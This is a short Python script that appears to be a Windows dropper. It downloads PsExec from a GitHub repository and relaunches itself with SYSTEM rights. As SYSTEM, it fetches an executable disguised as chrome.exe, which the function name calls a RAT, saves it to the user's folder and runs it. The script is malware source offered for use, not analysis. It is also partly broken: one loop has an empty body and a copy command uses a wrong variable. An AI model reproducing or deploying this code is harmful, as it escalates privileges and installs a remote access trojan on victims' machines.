import os
import urllib3
import getpass
import sys

def copy(file_src, file_dst):
	os.popen(f"cp {file_src} file_dst")

def exec(file_name):
	os.startfile(file_name)

def get_root():
	http = urllib3.PoolManager()
	try:
		url = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe"
		r = http.request("GET", url)
		usr = str(getpass.getuser())
		if "'" in usr:
			usr = usr.replace("'","")
		with open("C:/Users/"+usr+"/PsExec.exe", "wb") as fln:
			fln.write(r.read())
		cmd = "C:/Users/"+usr+"/PsExec.exe " + "--accept-eula -i -s " + sys.argv[0]
		os.popen(cmd)
	except:
		url = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec64.exe"
		r = http.request("GET", url)
		usr = str(getpass.getuser())
		if "'" in usr:
			usr = usr.replace("'","")
		with open("C:/Users/"+usr+"/PsExec.exe", "wb") as fln:
			fln.write(r.read())
		cmd = "C:/Users/"+usr+"/PsExec.exe " + "--accept-eula -i -s " + sys.argv[0]
		os.popen(cmd)

def down_rat():
	http = urllib3.PoolManager()
	url = "https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe"
	r = http.request("GET", url)
	usr = str(getpass.getuser())
	if "'" in usr:
		usr = usr.replace("'","")
	fln_rat = "C:/Users/"+usr+"/Documenti/chr.exe"
	with open(fln_rat, "wb") as fln:
		fln.write(r.read())
	exec(fln_rat)

def main():
	test = os.popen("whoami").read()
	if "system" in test:
		down_rat()
		for x in range(50):
	else:
		get_root()
